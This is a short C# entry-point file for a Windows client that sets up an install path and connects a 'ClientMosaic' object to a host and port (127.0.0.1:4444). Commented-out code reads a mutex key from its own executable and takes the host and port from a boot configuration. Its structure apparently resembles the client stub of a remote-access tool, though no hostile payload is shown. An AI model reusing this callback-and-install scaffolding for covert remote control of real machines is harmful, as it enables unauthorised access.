using Client.Controllers;
using Client.Models;
using System;
using System.IO;
using System.Windows.Forms;

namespace Client
{
    static class Program
    {

        public static ClientMosaic client;
        public static BootController bootController;

        /// <summary>
        /// Point d'entrée principal de l'application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            bool result;

            //bootController = new BootController();
            //StreamReader readerMutex = new StreamReader(System.Reflection.Assembly.GetExecutingAssembly().Location);
            //var mutexKey = BootController.getMutexKey(readerMutex);
            //var mutex = new System.Threading.Mutex(true, mutexKey, out result);

            //if (!result)
            //{
            //    MessageBox.Show("Another instance of application is already running !");
            //    return;
            //}
            ClientData.installPath = Path.Combine(AuthenticationController.DIRECTORY, ((!string.IsNullOrEmpty(AuthenticationController.SUBDIRECTORY)) ? AuthenticationController.SUBDIRECTORY + @"\" : "") + AuthenticationController.INSTALLNAME);
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            client = new ClientMosaic("127.0.0.1", 4444);
            //client = new ClientMosaic(bootController.host, bootController.port);
            client.connect();
            //GC.KeepAlive(mutex);
        }
    }
}
